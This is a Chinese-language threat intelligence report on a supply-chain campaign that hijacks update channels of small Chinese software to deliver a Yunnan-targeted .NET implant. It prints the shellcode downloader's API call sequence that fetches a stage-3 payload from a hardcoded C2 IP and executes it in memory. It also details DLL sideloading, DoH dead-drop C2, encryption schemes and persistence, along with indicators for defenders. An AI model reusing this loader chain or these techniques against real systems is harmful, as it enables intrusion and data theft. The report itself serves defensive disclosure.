01 背景

近年来，攻击者将目光转向安全建设相对薄弱的国产小型软件供应链。这类软件多采用 HTTP 明文接口下发更新，且不校验更新包的数字签名，攻击者只要控制更新配置接口或劫持目标流量即可向终端用户推送恶意安装包。

2026 年 10 月底，奇安信威胁情报中心红雨滴团队通过私有情报 AI 生产流程，持续监控到一起大规模的国产软件更新供应链行动，恶意更新包会验证受害者地理位置，如果位于云南省则继续执行，否则退出。截止到目前为止观察到六个国产软件的更新渠道被劫持，涵盖加速器、财务软件、鼠标连点器、电商浏览器，还发现了木马化的某即时通讯客户端和被篡改的某系统管理工具。

该行动使用 DNS over HTTPS（DoH）TXT 记录作为死信箱下发 C2 配置，最终植入体采用插件化架构在内存中加载 .NET 程序集执行，不落盘。所有变体共享一个独特的命名管道后缀 MyControlPipeaaa，成为跨变体的稳定同源判据。本文对该行动的投递机制、武器组件、C2 通信架构和同源关系进行完整披露。

三个样本的沙箱行为均连接同一 C2 IP 107.173.84.53，依次请求 /information.php、/fjai87gajio.zip、/newxx_x64，共享同一 stage-2 ZIP 文件名和 stage-3 载荷名。其中两个样本的 PE 时间戳精确到秒一致（2026-08-10T09:40:38Z），imphash 一致，证明来自同一个编译产物。

这类小型国产软件多由个人开发者或小团队维护，用户量在数十万至百万级，安全建设基本空白。调查中发现，受影响软件的更新通道存在系统性安全缺陷，使得攻击者无需入侵开发者环境即可实施投毒：

  • 无传输加密：更新配置接口使用明文 HTTP，在网络链路上可被中间人篡改返回内容
  • 完整性校验无独立性：版本校验使用的 MD5 与下载地址在同一响应中下发，攻击者可同时替换二者
  • 无代码签名验证：下载的 EXE 直接执行，不校验 Authenticode 签名或开发者证书
  • 版本号触发无鉴权：攻击者只需设置高于受害主机当前版本的版本号，即可触发自动更新流程

这四项缺陷的组合意味着，攻击者一旦具备修改更新配置响应的能力（无论是入侵配置服务器、DNS 劫持还是中间人攻击），即可向全部用户静默推送任意恶意安装包。完整的更新劫持与木马执行流程见附图。

dsemanager.exe 是 AMD Display Session Manager 正版组件，带有效 Authenticode 签名。它在运行时按名 LoadLibrary 加载 AMD ADL 库 atiadlxy.dll，攻击者在同目录放置同名恶意 DLL 实现 DLL 搜索顺序劫持。该恶意 DLL 无任何导出函数，DllMain 在 LoadLibrary 时即执行。

ZIP 条目同时带 DOS 本地时间与 NTFS FILETIME，三条目一致的 +8h 偏移证明打包主机时区为 UTC+8。其中 atiadlxy.dll 的 PE 编译时间与 ZIP 内 mtime 仅差 0.3 秒，说明编译完毕后立即打包，是为此次投递现场编译的。

Shellcode 下载器——install.dat

install.dat 是一段 891 字节的纯内存下载器。无导入表，靠 PEB 遍历按哈希值动态解析 API。API 哈希算法种子为 0x14A1，使用 h = h * 0x21 + toupper(c) 的迭代公式，模块哈希与函数哈希相加作为最终查找值。其行为链为：

LoadLibraryA("wininet")

InternetOpenA(NULL, DIRECT, NULL, NULL, 0) // 不发 User-Agent

InternetConnectA(h, "107.173.84.53", 443, ...) // C2 IP 硬编码

HttpOpenRequestA(h, "GET", "/newxx_x64", ...) // stage-3 路径

InternetSetOptionA(h, SECURITY_FLAGS, 0x3380) // 显式关闭 TLS 证书校验

HttpSendRequestA

VirtualAlloc(NULL, 0x1400000, COMMIT|RESERVE, RWX) // 20 MiB 可执行缓冲

InternetReadFile(..., 512000, ...)

call rsi // 直接跳入缓冲区执行

全程不落盘，且在两处显式关闭了 TLS 证书校验（IGNORE_UNKNOWN_CA、IGNORE_CERT_CN_INVALID 等全部标志），不验证服务器身份。

RemoteExeLoader 植入体详析

最终 .NET 植入体命名空间为 RemoteExeLoader，工程名 new-test-demo，无混淆。其核心能力包括：

  • 插件化架构

    从 C2 下载 .NET 程序集，经 base64 + AES-256-CBC 解密后通过 Assembly.Load 在内存中加载执行，不落盘，经过我们测试该特种木马拥有高达23个插件

  • 命名管道控制

    每个插件使用 <plugin_name>_MyControlPipeaaa 命名管道通信，支持停止命令

  • 主机指纹

    采集 WMI 硬件信息 + 物理 MAC（排除虚拟网卡）生成 SHA-256 GUID，落地两处互为备份

  • 回传加密

    AES-128-ECB，密钥 = MD5("history" + guid) 前 16 字符——防守方知道 guid 即可离线解密

  • 地域定向

    ip-api.com 查询受害机地理位置，校验「Yunnan」——明确针对云南省目标

  • 持久化

    计划任务「Dsemanager Update」，每 2 小时运行（PT2H）

  • 心跳

    15–30 分钟随机间隔

业务 C2 端点使用固定路径前缀 /wA8zS0xD8gT3-zzz/，固定口令参数 pass=xV6kE6cP。插件 URL 中的占位域名 ms.jsf.ink 在运行时被替换为实际 C2 域名。含 copyapp 或 appscreen 的插件在 STA 线程执行，指向剪贴板/屏幕捕获类功能。

05 同源分析

以下判据将四种投递机制关联为同一攻击者：

  • MyControlPipeaaa 命名管道后缀

    跨全部变体一致，VT 全库搜索仅命中本活动（40 个文件）

  • DoH TXT 死信箱架构

    相同的 /resolve?name=<domain>&type=TXT 模式

  • 中国境内 DNS 解析器优先

    两套配置都将阿里系解析器排在前列

  • mmca-cdn.com 域名共享

    Inno Setup 变体的 C2（img01/21/31）与 PE 注入变体的下载点（mp.）属同一注册域

  • 同一 C2 IP + 相同 URI 路径

    三个 Inno Setup 样本的沙箱行为均连接 107.173.84.53，依次请求相同路径

06 总结

该行动是一起针对多款中国国产小型软件更新通道的批量供应链投毒行动，具备以下特征：

  • 多投递机制并行

    以 Inno Setup 包装为主力，辅以 PE 注入和源码编译，至少三种手法并行

  • C2 通信隐蔽

    DoH TXT 死信箱下发域名配置，插件经 AES 加密内存加载，回传数据加密

  • 活跃运营

    stage-3 载荷持续更新，TXT 记录活跃，基建在维护中

  • 地域定向明确

    多层独立证据指向中国境内云南省目标

  • 能力盲区

    插件载荷未获取，窃密/横移/勒索的具体能力均在插件中，是当前最大的分析空白

建议立即回溯以下指标：计划任务名 Dsemanager Update、命名管道含 _MyControlPipeaaa、DNS 查询 *.fmcag.org / *.mmca-cdn.com / *.mmp-gep.org、以及 DoH 请求特征（非浏览器进程发起的 /dns-query?dns= 或 /resolve?name=）。
